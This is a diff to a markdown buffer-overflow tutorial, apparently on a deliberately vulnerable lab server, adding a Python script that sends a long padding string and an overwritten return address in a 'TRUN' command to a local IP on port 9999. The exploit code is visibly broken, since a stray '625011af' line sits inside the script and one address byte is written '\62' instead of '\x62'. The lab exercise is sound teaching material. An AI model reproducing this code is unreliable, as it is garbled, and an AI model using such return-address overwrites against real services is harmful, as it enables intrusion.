@@ -33,6 +33,25 @@ So the hex code equivalent of `JMP ESP` is `FFE4`
 
 The highlighted box result is what we are more interested in, so go back to your terminal and exit the nasm_shell.rb  , Now copy this python code and save it
 
-```shell
+```python
+#!/usr/bin/python
+ 
+import sys, socket
 
+625011af
+
+# replace 2003 with the offset you got 
+shellcode = "A" * 2003 + "\xaf\x11\x50\62"
+
+try: 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.0.106',9999))
+        s.send(('TRUN /.:/' + shellcode))
+        s.close()
+
+except:
+        print ("Error Connecting to the server")
+        sys.exit()
 ```
+
+- First of all if you notice in this script we have a standalone hex which is `625011af` gotten from the first result 
